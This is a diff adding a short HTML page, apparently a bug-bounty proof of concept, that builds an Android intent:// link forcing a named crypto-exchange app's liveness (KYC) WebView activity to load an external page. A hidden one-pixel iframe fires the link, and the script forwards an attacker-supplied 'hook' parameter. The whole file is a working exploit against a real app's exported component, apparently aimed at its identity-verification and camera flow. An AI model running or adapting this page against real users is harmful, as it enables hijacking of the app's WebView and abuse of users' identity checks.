@@ -1,0 +1,14 @@
+<!doctype html><html><body style="font:15px monospace;padding:8px"><h3>KYC-CHAIN-U</h3><pre id="o">arming</pre>
+<iframe id="f" style="width:1px;height:1px"></iframe>
+<script>
+// 读取外层 ?hook= 并透传给容器内页面；运行期 cache-buster 避免 WebView 缓存
+var q={}; location.search.replace(/^\?/,'').split('&').forEach(function(kv){var p=kv.split('=');if(p[0])q[p[0]]=decodeURIComponent(p[1]||'')});
+var hook=q.hook||'';
+var inner='https://createnewdemo.github.io/bbprobe/cam_u.html?cb='+Date.now()
+        + (hook? '&hook='+encodeURIComponent(hook) : '') + '&token=t&signatureId=s';
+var intent='intent://#Intent;action=android.intent.action.VIEW'
+ +';component=com.bybit.app%2Faai.liveness.web.SolutionActivity'
+ +';S.url='+inner.replace(/&/g,'%26')+';end';
+document.getElementById('o').textContent+='\nhook='+(hook||'(none)')+'\n'+intent;
+document.getElementById('f').src=intent;
+</script></body></html>
